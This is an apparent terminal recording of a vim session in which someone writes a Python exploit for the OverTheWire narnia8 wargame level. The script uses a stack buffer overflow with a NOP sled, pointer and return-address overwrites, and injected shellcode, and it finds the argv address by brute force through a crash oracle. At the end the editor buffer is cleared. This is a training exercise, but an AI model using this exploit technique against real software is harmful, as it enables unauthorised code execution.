[31.613428, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, subprocess, sys, os, time\r\r\nsc = \u001b[36mopen\u001b[m(\u001b[31m\"/tmp/l8.bin\"\u001b[m, \u001b[31m\"rb\"\u001b[m).read()\u001b[2;38H\u001b[K\u001b[3;1H\u001b[34m# narnia8: func(b) copies b into bok[20] byte by byte through the pointer blah at\u001b[m\u001b[3;82H\u001b[K\u001b[4;1H\u001b[34m# ebp-0x4. bok[20..23] IS blah, so at i=20 the loop overwrites its own source pointer\r\r\n# with argv[20]. argv[20..23] must keep pointing at readable data - point it at the\r\r\n# argv area itself. The loop then continues to bok[28..31] = the return address,\r\r\n# copied from argv[28..31]: point it at the NOP sled placed at argv+32.\r\r\n# argv has no NULs, no ASLR -> the argv address is found with a segfault oracle.\u001b[m\r\r\n\u001b[33massert\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m sc\r\r\n\u001b[33mdef\u001b[m \u001b[36mpayload\u001b[m(argv_addr):\r\r\n    \u001b[34m# one argv[1]: bytes 0..19 sled-filler, 20..23 = &argv[1] (keeps blah valid),\r\r\n\u001b[m    \u001b[34m# 24..27 saved EBP filler, 28..31 = ret into the sled that follows at +32.\u001b[m\r\r\n    \u001b[33mreturn\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m20\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, argv_addr) + \u001b[31mb\"BBBB\"\u001b[m\u001b[9C+ struct.pack(\u001b[31m\"<I\"\u001b[m, argv_add\u001b[14;1Hdr + \u001b[31m32\u001b[m) + \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m100\u001b[m + sc\r\r\n\u001b[33mdef\u001b[m \u001b[36mtry_addr\u001b[m(argv_addr):\r\r\n    \u001b[34m# real payload: a correct &argv[1] makes the copy self-consistent, func returns\r\r\n\u001b[m    \u001b[34m# into the sled and the shellcode write(1,\"PWN!\",4) hits stdout UNBUFFERED.\r\r\n\u001b[m    \u001b[34m# wrong candidates crash BEFORE any flush (printf is fully buffered on a pipe)\r\r\n\u001b[m    \u001b[34m# -> empty stdout. Hit = PWN! visible in the raw stream.\u001b[m\r\r\n    \u001b[33mif\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33min\u001b[m struct.pack(\u001b[31m\"<I\"\u001b[m, argv_addr) \u001b[33mor\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33min\u001b[m struct.pack(\u001b[31m\"<I\"\u001b[m, argv_addr + \u001b[31m32\u001b[m):\u001b[21;9H\u001b[33mreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    pl = \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m20\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, argv_addr) + \u001b[31mb\"BBBB\"\u001b[m \u001b[35m\\\u001b[m\u001b[23;9H+ struct.pack(\u001b[31m\"<I\"\u001b[m, argv_addr + "]
[31.62273, "o", "\u001b[31m32\u001b[m) + \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m100\u001b[m + sc\r\r\n    \u001b[33mtry\u001b[m:\u001b[25;9Hp = subprocess.Popen([\u001b[31mb\"/narnia/narnia8\"\u001b[m, pl],\u001b[26;30Hstdout=subprocess.PIPE, stderr=subprocess.STDOUT,\u001b[27;30Henv={}, bufsize=\u001b[31m0\u001b[m)\r\r\n    \u001b[33mexcept\u001b[m \u001b[32mValueError\u001b[m:\u001b[29;9H\u001b[33mreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    \u001b[35mimport\u001b[m time, os \u001b[33mas\u001b[m _os, fcntl\r\r\n    fd = p.stdout.fileno()\r\r\n    fl = fcntl.fcntl(fd, fcntl.F_GETFL)\r\r\n    fcntl.fcntl(fd, fcntl.F_SETFL, fl | _os.O_NONBLOCK)\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
[74.699959, "o", "\u001b[?25l\u001b[34;73H^[\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[34;73H^[\u001b[1;1H\u0007\u001b[34;73H  \u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr=\r\u001b[82C1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;73HdG\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                                                                                                   \u001b[7;1H~                                                                                                   \u001b[8;1H~                                                                                                   \u001b[9;1H~                                                                                                   \u001b[10;1H~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                                                   \u001b[18;1H~                                                                                                   \u001b[19;1H~                                                                                                   \u001b[20;1H~                                                                                                   \u001b[21;1H~                                                                                                   \u001b[22;1H~                                                                                                   \u001b[23;1H~                                                                                                   \u001b[24;1H~                                                                                                   \u001b[25;1H~                                                                                                   \u001b[26;1H~                                                                                                   \u001b[27;1H~                                                                                                   \u001b[28;1H~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[32;1H~                                                                                                   \u001b[33;1H~                                                                                                   \u001b[m\u001b[34;1H--No lines in buffer--\u001b